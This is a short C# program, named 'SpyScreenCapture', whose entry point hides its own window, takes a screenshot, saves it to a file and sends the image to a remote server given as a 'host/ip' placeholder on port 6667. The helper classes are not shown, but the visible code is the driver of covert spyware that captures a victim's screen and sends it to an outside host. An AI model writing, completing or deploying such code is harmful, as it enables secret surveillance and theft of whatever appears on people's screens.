namespace SpyScreenCapture
{
    internal class Program
    {
        static void Main(string[] args)
        {
            DisableWindowView disableWindowView = new DisableWindowView();
            
            var screenShot = CaptureScreen.CaptureScreenToByteArray(System.Drawing.Imaging.ImageFormat.Png);
            CaptureScreen.CaptureScreenToFile("testScreen", System.Drawing.Imaging.ImageFormat.Png);
            DataSender.SendDataToServer("host/ip", 6667, screenShot);


            Console.ReadKey();
        }
    }
}
